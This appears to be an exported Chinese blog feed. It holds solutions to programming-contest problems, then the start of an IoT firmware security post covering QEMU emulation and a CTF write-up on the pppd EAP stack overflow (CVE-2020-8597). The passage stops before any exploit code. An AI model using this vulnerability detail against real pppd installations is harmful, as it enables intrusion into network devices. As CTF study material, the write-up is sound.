class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pow2 = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">31</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pow2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;结果</span><br><span class="line">13!:6227020800</span><br><span class="line">n的最大值:2147483648</span><br></pre></td></tr></table></figure>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>枚举所有的</p>
<ol>
<li>首先长度最长为12，从12开始减（依次枚举所有长度len的乘积【从2开始，，，】）</li>
<li>判断能否被n整除，如果可以的话，因为是从最大开始，这次就是最大值。</li>
</ol>
<h3 id="int取值范围"><a href="#int取值范围" class="headerlink" title="int取值范围"></a>int取值范围</h3><p>最大值：2^31-1</p>
<p>所以本次，，，n可以取int，但是ans可能超过int最大值，所以需要long long</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">max</span> = <span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">12</span>; len &gt;= <span class="number">1</span> ; --len) &#123;<span class="comment">//最大长度为12，依次暴力所有的的长度情况</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">2</span>; start &lt;= <span class="built_in">max</span>; ++start) &#123;</span><br><span class="line">            ans = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; start + len; ++i) &#123;</span><br><span class="line">                ans *= i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n % ans == <span class="number">0</span>)&#123;<span class="comment">//如果是合法的</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="built_in">endl</span>&lt;&lt;start;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = start+<span class="number">1</span>; j &lt; start+len; ++j) &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"*"</span>&lt;&lt;j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//如果是质数，，，因为最大也只是sqrt(n)，所以上面出不来结果，，，就手动加上来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实是比较简单的题，，，但是上次做的时候，没有时间，紧张，就没有认真看下去，结果，，，校赛就出了一道类似的，苦苦。</p>
</blockquote>
<h2 id="L1-007-念数字"><a href="#L1-007-念数字" class="headerlink" title="L1-007 念数字"></a>L1-007 念数字</h2><blockquote>
<p>涉及字符串，，，使用java比较easy，，，</p>
<p>主要就是用map来存储，输入直接用字符串，，，</p>
</blockquote>
<h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exercise;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ex_7</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Map&lt;Character,String&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		hashmap.put(<span class="string">'0'</span>, <span class="string">"ling"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'1'</span>, <span class="string">"yi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'2'</span>, <span class="string">"er"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'3'</span>, <span class="string">"san"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'4'</span>, <span class="string">"si"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'5'</span>, <span class="string">"wu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'6'</span>, <span class="string">"liu"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'7'</span>, <span class="string">"qi"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'8'</span>, <span class="string">"ba"</span>);</span><br><span class="line">		hashmap.put(<span class="string">'9'</span>, <span class="string">"jiu"</span>);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		String s  = scan.next();</span><br><span class="line">		<span class="keyword">char</span>[] arr = s.toCharArray();</span><br><span class="line">		<span class="keyword">if</span>(s.length()==<span class="number">1</span>) &#123;</span><br><span class="line">			System.out.println(hashmap.get(arr[<span class="number">0</span>]));</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(hashmap.containsKey(arr[<span class="number">0</span>])) &#123;</span><br><span class="line">			System.out.print(hashmap.get(arr[<span class="number">0</span>])+<span class="string">" "</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.print(<span class="string">"fu "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		String ans=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(hashmap.containsKey(arr[i])) &#123;</span><br><span class="line">				ans += hashmap.get(arr[i])+<span class="string">" "</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = ans.substring(<span class="number">0</span>,ans.length()-<span class="number">1</span>);</span><br><span class="line">		System.out.println(ans);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h3><blockquote>
<p>思路总体一样的</p>
<p>但看起来更简洁，，，<del>如果会写的话，，，TAT</del></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="built_in">string</span>&gt; mmap;</span><br><span class="line">    mmap[<span class="string">'-'</span>] = <span class="string">"fu"</span>;</span><br><span class="line">    mmap[<span class="string">'0'</span>] = <span class="string">"ling"</span>;</span><br><span class="line">    mmap[<span class="string">'1'</span>] = <span class="string">"yi"</span>;</span><br><span class="line">    mmap[<span class="string">'2'</span>] = <span class="string">"er"</span>;</span><br><span class="line">    mmap[<span class="string">'3'</span>] = <span class="string">"san"</span>;</span><br><span class="line">    mmap[<span class="string">'4'</span>] = <span class="string">"si"</span>;</span><br><span class="line">    mmap[<span class="string">'5'</span>] = <span class="string">"wu"</span>;</span><br><span class="line">    mmap[<span class="string">'6'</span>] = <span class="string">"liu"</span>;</span><br><span class="line">    mmap[<span class="string">'7'</span>] = <span class="string">"qi"</span>;</span><br><span class="line">    mmap[<span class="string">'8'</span>] = <span class="string">"ba"</span>;</span><br><span class="line">    mmap[<span class="string">'9'</span>] = <span class="string">"jiu"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s ;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; s.length()<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;mmap[s[i]]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;mmap[s[i]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="L1-008-求整数段和"><a href="#L1-008-求整数段和" class="headerlink" title="L1-008 求整数段和"></a>L1-008 求整数段和</h2><blockquote>
<p><del>easy</del></p>
</blockquote>
<h3 id="每个数字占5个字符宽度"><a href="#每个数字占5个字符宽度" class="headerlink" title="每个数字占5个字符宽度"></a>每个数字占5个字符宽度</h3><p>使用格式化字符串 =&gt; <del>快乐</del></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a,len=<span class="number">1</span>; i &lt;= b ; ++i,len++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br><span class="line">        sum += i;</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">5</span> ==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((b-a+<span class="number">1</span>)%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Sum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nSum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="L1-009-N个数求和"><a href="#L1-009-N个数求和" class="headerlink" title="L1-009 N个数求和"></a>L1-009 N个数求和</h2><blockquote>
<p>首先计算分数加法公式：</p>
<p><img src="file:///C:\Users\YCNN\Documents\Tencent Files\1187691781\Image\C2C\9CFF06029FD196D5E19F7D9FF8F6B771.png" alt="img"></p>
<p>然后计算结果分子分母的最大公约数，然后相除，得到最简分数</p>
<p>这里需要考虑的地方：</p>
<ol>
<li>分母小于0 =&gt; 把符号换到分子上去</li>
<li>分子小于0，说明为0，为了方便后期的计算，将分母置为0，防止该数的影响</li>
</ol>
<p>最后，根据能否整除，输出不同的结果。</p>
</blockquote>
<h3 id="scanf输入"><a href="#scanf输入" class="headerlink" title="scanf输入"></a>scanf输入</h3><p>这里使用scanf输入，，因为知道两个数字中间一定有一个/，可以简化，，，不用特意接受字符’/‘</p>
<h3 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h3><p>固定格式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">beauty</span><span class="params">(<span class="keyword">int</span> &amp;a1,<span class="keyword">int</span> &amp;b1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        a1 = -a1;</span><br><span class="line">        b1 = -b1;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 == <span class="number">0</span>)&#123;</span><br><span class="line">        b1 = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> simple = gcd(<span class="built_in">abs</span>(a1),<span class="built_in">abs</span>(b1));</span><br><span class="line">        a1 /= simple;</span><br><span class="line">        b1 /= simple;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> a1,b1,a2,b2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a1,&amp;b1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a2,&amp;b2);</span><br><span class="line">        a1 = a1 * b2 + a2 * b1;</span><br><span class="line">        b1 = b1 * b2;</span><br><span class="line">        beauty(a1,b1);</span><br><span class="line">    &#125;</span><br><span class="line">    beauty(a1,b1);<span class="comment">//如果只有一个式子，不会进入循环，，，但是输入可能不是最简的</span></span><br><span class="line">    <span class="keyword">if</span>(b1 == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 &lt; b1)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1/b1&lt;&lt;<span class="string">" "</span>&lt;&lt;a1 % b1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="L1-010-比较大小"><a href="#L1-010-比较大小" class="headerlink" title="L1-010 比较大小"></a>L1-010 比较大小</h2><blockquote>
<p>只是对三个数排序，，，非常简单</p>
</blockquote>
<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">sort(arr,arr+<span class="number">3</span>);<span class="comment">//arr是数组名，3是arr的长度</span></span><br></pre></td></tr></table></figure>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;arr[<span class="number">0</span>]&gt;&gt;arr[<span class="number">1</span>]&gt;&gt;arr[<span class="number">2</span>];</span><br><span class="line">    sort(arr,arr+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">1</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="L1-011-A-B"><a href="#L1-011-A-B" class="headerlink" title="L1-011 A-B"></a>L1-011 A-B</h2><blockquote>
<p><del>本来是用eclipse的replace做的，但是超时了，，，555</del></p>
<p><img src="/2021/03/19/10-59/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210319201138492.png" alt="image-20210319201138492"></p>
<p>正确的思路：</p>
<p>遍历第二个字符串，用长度为256（ascii表长度）的数组记录又那些出现过的字符，最后再对第一个字符串遍历，根据数组是否出现过，，，。这里数组的存储的index就是字符串的ascii码【这点比较interesting】</p>
</blockquote>
<h3 id="c-输入一行"><a href="#c-输入一行" class="headerlink" title="c++输入一行"></a>c++输入一行</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">getline(<span class="built_in">cin</span>,a);</span><br></pre></td></tr></table></figure>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> mark[<span class="number">256</span>];</span><br><span class="line">    getline(<span class="built_in">cin</span>,a);</span><br><span class="line">    getline(<span class="built_in">cin</span>,b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.length() ; ++i) &#123;</span><br><span class="line">        mark[b[i]] = <span class="number">1</span>;<span class="comment">//直接将字符串的ascii码作为数组下表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.length() ; ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mark[a[j]] == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="L1-012-计算指数"><a href="#L1-012-计算指数" class="headerlink" title="L1-012 计算指数"></a>L1-012 计算指数</h2><blockquote>
<p>pow（底数，幂次）的结果是double型的，，，，不知道为什么不能强转到int，，，</p>
<p>就输出是f了</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2^%d = %.f"</span>,n,<span class="built_in">pow</span>(<span class="number">2</span>,n));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>天梯赛</tag>
      </tags>
  </entry>
  <entry>
    <title>固件iot基础</title>
    <url>/2020/10/22/01-08/</url>
    <content><![CDATA[<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
<p><img src="/2020/10/22/01-08/image-20200829170912807.png" alt="image-20200829170912807"></p>
<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
<ul>
<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
</ul>
<p>使用：</p>
<ul>
<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
</ul>
<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
<ul>
<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/22/01-08/image-20200829174231769.png" alt="image-20200829174231769"></p>
<ul>
<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/22/01-08/image-20200829174236510.png" alt="image-20200829174236510"></p>
<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
<ol>
<li>nday cve 漏洞分析和利用；</li>
<li>mips 指令集栈溢出漏洞的调试和利用</li>
</ol>
<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
<p>漏洞点：</p>
<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
<p><img src="/2020/10/22/01-08/image-20200830121124694.png" alt="image-20200830121124694"></p>
<p>操作步骤：</p>
<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
<p><img src="/2020/10/22/01-08/image-20200830121439048.png" alt="image-20200830121439048"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
<p>（2）编辑<code>etc/inittab</code></p>
<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
